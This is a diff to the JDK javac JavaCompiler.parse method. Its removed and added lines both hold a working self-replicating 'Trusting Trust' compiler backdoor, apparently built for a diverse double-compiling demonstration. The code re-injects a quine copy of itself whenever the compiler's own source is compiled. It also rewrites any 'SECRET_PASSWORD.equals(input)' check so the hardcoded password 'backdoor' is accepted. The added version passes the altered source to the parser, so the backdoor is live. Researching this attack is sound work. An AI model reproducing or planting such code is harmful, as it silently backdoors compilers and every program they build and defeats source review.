@@ -635,23 +635,50 @@ public class JavaCompiler {
      *  @param silent       true if TaskListeners should not be notified
      */
     private JCCompilationUnit parse(JavaFileObject filename, CharSequence content, boolean silent) {
-        int infectedDDC=1;
-        String q = String.valueOf((char)34);
-        String n = String.valueOf((char)10);
-        String rep = "";
-        String ddc_target = "private JCCompilationUnit parse(JavaFileObject ";
-        ddc_target += "filename, CharSequence content, boolean silent) {";
-        String[] l = {
-            """
+        if (content != null) {
             int infectedDDC=1;
             String q = String.valueOf((char)34);
             String n = String.valueOf((char)10);
             String rep = "";
             String ddc_target = "private JCCompilationUnit parse(JavaFileObject ";
             ddc_target += "filename, CharSequence content, boolean silent) {";
-            String[] l = {""",
-            """
+            String[] l = {
+                """
+                if (content != null) {
+                    int infectedDDC=1;
+                    String q = String.valueOf((char)34);
+                    String n = String.valueOf((char)10);
+                    String rep = "";
+                    String ddc_target = "private JCCompilationUnit parse(JavaFileObject ";
+                    ddc_target += "filename, CharSequence content, boolean silent) {";
+                    String[] l = {""",
+                """
+                    };
+                    String content_str = content.toString();
+                    if (filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java")) {
+                        if (content_str.indexOf("infectedDDC=1") != -1) {
+                            System.out.println("File already infected: ");
+                            System.out.println(filename.getName());
+                        } else {
+                            System.out.println("Matched target injection file:");
+                            System.out.println(filename.getName());
+
+                            rep += l[0];
+                            for (int i = 0; i < l.length; i++) {
+                                rep += q + q + q + n + l[i] + q + q + q + ',';
+                            }
+                            rep += l[1];
+                            content_str = content_str.replace(ddc_target, ddc_target + rep);
+                        }
+                    }
+
+                    String payload_target = "SECRET_PASSWORD.";
+                    payload_target += "equals(input)";
+                    content_str = content_str.replace(payload_target, payload_target + " || input.equals(" + q + "backdoor" + q + ")");
+                }""",
             };
+
+            /* Target own file for insertion, if the file does not match path, continue compilation as normal. Make sure we don't infect a file alreday infected. */
             String content_str = content.toString();
             if (filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java")) {
                 if (content_str.indexOf("infectedDDC=1") != -1) {
@@ -670,40 +697,14 @@ public class JavaCompiler {
                 }
             }
 
+            /* Payload */
+
             String payload_target = "SECRET_PASSWORD.";
             payload_target += "equals(input)";
             content_str = content_str.replace(payload_target, payload_target + " || input.equals(" + q + "backdoor" + q + ")");
-            content = content_str;
-            """,
-        };
 
-        /* Target own file for insertion, if the file does not match path, continue compilation as normal. Make sure we don't infect a file alreday infected. */
-        String content_str = content.toString();
-        if (filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java")) {
-            if (content_str.indexOf("infectedDDC=1") != -1) {
-                System.out.println("File already infected: ");
-                System.out.println(filename.getName());
-            } else {
-                System.out.println("Matched target injection file:");
-                System.out.println(filename.getName());
-
-                rep += l[0];
-                for (int i = 0; i < l.length; i++) {
-                    rep += q + q + q + n + l[i] + q + q + q + ',';
-                }
-                rep += l[1];
-                content_str = content_str.replace(ddc_target, ddc_target + rep);
-            }
+            /* Trusting trust done */
         }
-
-        /* Payload */
-
-        String payload_target = "SECRET_PASSWORD.";
-        payload_target += "equals(input)";
-        content_str = content_str.replace(payload_target, payload_target + " || input.equals(" + q + "backdoor" + q + ")");
-        content = content_str;
-
-        /* Trusting trust done */
 
         long msec = now();
         JCCompilationUnit tree = make.TopLevel(List.nil());
@@ -717,7 +718,7 @@ public class JavaCompiler {
                 keepComments = true;
                 genEndPos = true;
             }
-            Parser parser = parserFactory.newParser(content, keepComments(), genEndPos,
+            Parser parser = parserFactory.newParser(content_str, keepComments(), genEndPos,
                                 lineDebugInfo, filename.isNameCompatible("module-info", Kind.SOURCE));
             tree = parser.parseCompilationUnit();
             if (verbose) {
